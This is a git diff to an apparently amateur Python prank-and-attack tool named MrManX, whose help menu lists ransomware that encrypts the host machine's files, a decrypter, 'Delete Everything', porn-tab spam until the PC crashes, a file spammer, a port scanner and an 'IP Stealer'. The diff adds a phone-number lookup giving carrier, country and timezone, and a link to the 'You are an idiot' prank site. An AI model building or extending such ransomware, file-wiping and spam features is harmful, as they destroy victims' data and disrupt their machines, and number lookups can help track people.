@@ -8,6 +8,13 @@ import socket
 import subprocess
 import requests
 import sys
+import phonenumbers
+import opencage
+from phonenumbers import geocoder
+from opencage.geocoder import OpenCageGeocode
+from phonenumbers import carrier
+from phonenumbers import timezone
+from phonenumbers import phonemetadata
 
 #Title Screen and loading
 print("|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#####~~~~~~~~~###~~~~~~|\n"
@@ -40,7 +47,7 @@ while True:
 
 			files = []
 			for file in os.listdir():
-				if file == "MrMan.py" or file == "the key.key":
+				if file == "MrManX.py" or file == "the key.key":
 					continue
 				if os.path.isfile(file):
 					files.append(file)
@@ -146,7 +153,7 @@ while True:
 		time.sleep(2)
 		print("Ready!")
 		time.sleep(0.5)
-		rc = input("-Welcome to Random Crap-\n1.Delete Everything!\n2.Naughty Web Spam 18+\n3.Endless File Maker\n>")
+		rc = input("-Welcome to Random Crap-\n1.Delete Everything!\n2.Naughty Web Spam 18+\n3.Numbered File Maker\n4.You are a Professional Idiot\n5.Phone Number Info Base\n>")
 		if rc == "1":
 			dfilesyn = input("Are you sure you want to do this! y/n > ")
 			if dfilesyn == "yes" or dfilesyn == "y":
@@ -173,4 +180,42 @@ while True:
 				os.system(command)
 				command = "echo MrMan was here >" + filename
 				os.system(command)
-				
+
+		if rc == "4":
+			webbrowser.open_new_tab('https://youareanidiot.cc/')	
+
+		if rc == "5":
+			num = input("What number do you want to find more about (Example: +(Country Code) The Number)")	
+			
+			print("__________________________________________")
+			parse_num = phonenumbers.parse(num)
+			location = geocoder.description_for_number(parse_num, "en")
+			print("Country - " + location)
+
+			ser_provider = phonenumbers.parse(num)
+			print("Service Provider - "+ carrier.name_for_number(ser_provider, "en"))
+
+			timeZone = str(timezone.time_zones_for_number(parse_num))
+			timez = "TimeZone - "
+			print(timez + timeZone)
+
+			reg_code = phonenumbers.region_code_for_number(parse_num)
+			print("Region Code - " + reg_code)
+
+			meta_data = phonemetadata.PhoneMetadata(parse_num)
+			print("Meta Data Found -",meta_data)
+
+					
+			print("---------------------------------------------")
+
+	if choice == "help" or choice == "h":
+		print("---------------")
+		print("|HELP CENTER|")
+		print("---------------------------------------------------------------------------------")
+		print("1. Ransomeware \n 1. Ransomeware - Ransomewares the machine with MrManX running on it \n 2. Ransomeware Decrypter -Decrypts the ransomeware with a key inputed by the user\n"
+		"2. Scanners \n 1. Port Scanner - Scans for open ports on the inputed IP\n 2. IP Ping - Pings a IP or website if it is active\n"
+		"3. Power Options \n 1. Shut down - Shuts down the machine\n 2. Restart - Restarts the Machine\n 3.Log Out - Logs out of the machine\n"
+		"4. IP \n 1. IP Stealer - Tells you the IP of the machine\n"
+		"5. Random Crap \n 1. Delete Everything - Deletes Everything\n 2. Naughty web spam 18+ - Loads multiple tabs of po*nhub untill MrManX is closed or PC Crashes\n"
+		" 3. Numbered File Maker - Makes as many files as you want\n 4. You are a Professional Idiot - A web version of the 'You are an idiot Virus'\n 5. Phone Number Info Base - Gives infomation about any vaild number that you input ")
+		print("---------------------------------------------------------------------------------")
